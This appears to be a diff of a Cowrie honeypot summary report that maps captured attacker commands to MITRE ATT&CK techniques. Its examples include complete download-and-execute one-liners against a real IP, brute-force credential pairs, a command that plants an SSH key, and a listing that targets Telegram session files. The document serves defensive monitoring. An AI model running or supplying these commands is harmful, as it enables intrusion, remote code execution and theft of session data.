@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-06 20:00:53",
+  "generated": "2026-09-06 21:02:21",
   "totals": {
-    "commands": 323,
-    "login_failed": 2972,
-    "login_success": 106,
-    "sessions": 2652
+    "commands": 332,
+    "login_failed": 3108,
+    "login_success": 116,
+    "sessions": 2797
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2972,
+      "count": 3108,
       "examples": [
         "root / Server@123",
         "admin / qazwsx",
@@ -21,14 +21,14 @@
         "root / server123"
       ],
       "first": "2026-09-06T00:01:48.192357Z",
-      "last": "2026-09-06T20:00:20.383070Z",
-      "unique_ips": 203
+      "last": "2026-09-06T21:02:07.088231Z",
+      "unique_ips": 215
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 117,
+      "count": 119,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -37,14 +37,14 @@
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/"
       ],
       "first": "2026-09-06T00:40:30.920724Z",
-      "last": "2026-09-06T18:40:21.692860Z",
-      "unique_ips": 12
+      "last": "2026-09-06T20:20:30.307025Z",
+      "unique_ips": 13
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 106,
+      "count": 116,
       "examples": [
         "ftpuser / ftpuser",
         "support / 22222",
@@ -53,14 +53,14 @@
         "ubuntu / ubuntu"
       ],
       "first": "2026-09-06T00:08:31.210876Z",
-      "last": "2026-09-06T19:55:25.359235Z",
-      "unique_ips": 92
+      "last": "2026-09-06T21:02:09.193269Z",
+      "unique_ips": 101
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 55,
+      "count": 59,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -69,14 +69,14 @@
         "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi"
       ],
       "first": "2026-09-06T00:40:30.920724Z",
-      "last": "2026-09-06T18:40:21.692860Z",
-      "unique_ips": 12
+      "last": "2026-09-06T20:20:30.303246Z",
+      "unique_ips": 13
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 10,
+      "count": 13,
       "examples": [
         "/bin/./uname -s -v -n -r -m",
         "uname -s -v -n -r -m",
@@ -85,8 +85,8 @@
         "cat /proc/cpuinfo"
       ],
       "first": "2026-09-06T00:57:39.682052Z",
-      "last": "2026-09-06T16:26:52.792511Z",
-      "unique_ips": 7
+      "last": "2026-09-06T21:02:10.146329Z",
+      "unique_ips": 10
     },
     {
       "id": "T1033",
@@ -105,15 +105,16 @@
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
-      "count": 7,
+      "count": 8,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam"
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
       ],
       "first": "2026-09-06T00:40:30.920724Z",
-      "last": "2026-09-06T15:32:27.792160Z",
-      "unique_ips": 2
+      "last": "2026-09-06T20:20:30.307025Z",
+      "unique_ips": 3
     },
     {
       "id": "T1070.004",
@@ -127,6 +128,20 @@
       "first": "2026-09-06T00:40:31.052946Z",
       "last": "2026-09-06T15:32:27.792160Z",
       "unique_ips": 2
+    },
+    {
+      "id": "T1083",
+      "name": "File and Directory Discovery",
+      "tactic": "Discovery",
+      "count": 3,
+      "examples": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va",
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
+      ],
+      "first": "2026-09-06T03:22:52.847139Z",
+      "last": "2026-09-06T20:20:30.307025Z",
+      "unique_ips": 3
     },
     {
       "id": "T1016",
@@ -155,17 +170,40 @@
       "unique_ips": 1
     },
     {
-      "id": "T1083",
-      "name": "File and Directory Discovery",
-      "tactic": "Discovery",
-      "count": 2,
+      "id": "T1037",
+      "name": "Boot or Logon Initialization Scripts",
+      "tactic": "Persistence",
+      "count": 1,
       "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C\nuname=$(for c in unam",
-        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va"
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
       ],
-      "first": "2026-09-06T03:22:52.847139Z",
-      "last": "2026-09-06T12:48:38.686669Z",
-      "unique_ips": 2
+      "first": "2026-09-06T20:20:30.307025Z",
+      "last": "2026-09-06T20:20:30.307025Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1098.004",
+      "name": "Account Manipulation: SSH Authorized Keys",
+      "tactic": "Persistence",
+      "count": 1,
+      "examples": [
+        "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ"
+      ],
+      "first": "2026-09-06T20:20:26.235027Z",
+      "last": "2026-09-06T20:20:26.235027Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1489",
+      "name": "Service Stop",
+      "tactic": "Impact",
+      "count": 1,
+      "examples": [
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
+      ],
+      "first": "2026-09-06T20:20:30.307025Z",
+      "last": "2026-09-06T20:20:30.307025Z",
+      "unique_ips": 1
     }
   ],
   "unmapped": [
